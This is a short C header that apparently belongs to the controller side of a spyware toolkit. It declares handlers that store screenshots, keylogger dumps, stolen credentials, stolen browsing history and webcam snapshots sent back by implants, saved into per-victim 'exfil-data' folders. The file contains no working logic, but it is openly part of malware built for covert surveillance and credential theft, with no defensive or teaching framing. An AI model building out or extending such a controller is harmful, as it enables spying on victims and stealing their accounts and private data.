#ifndef SPYWARE_CONTROLLER_H
#define SPYWARE_CONTROLLER_H

#include "protocol.h"

/* Handlers for spyware responses on the controller side.
 * save_dir: per-implant directory, e.g. "exfil-data/DESKTOP-ABC-192.168.1.5"
 * The directory is created by ensure_save_dir() before any file is written. */
void ensure_save_dir(const char *save_dir);
void handle_screenshot_response(Packet *resp, const char *save_dir);
void handle_keylog_dump_response(Packet *resp, const char *save_dir);
void handle_cred_steal_response(Packet *resp, const char *save_dir);
void handle_history_steal_response(Packet *resp, const char *save_dir);
void handle_camera_snapshot_response(Packet *resp, const char *save_dir);

#endif /* SPYWARE_CONTROLLER_H */
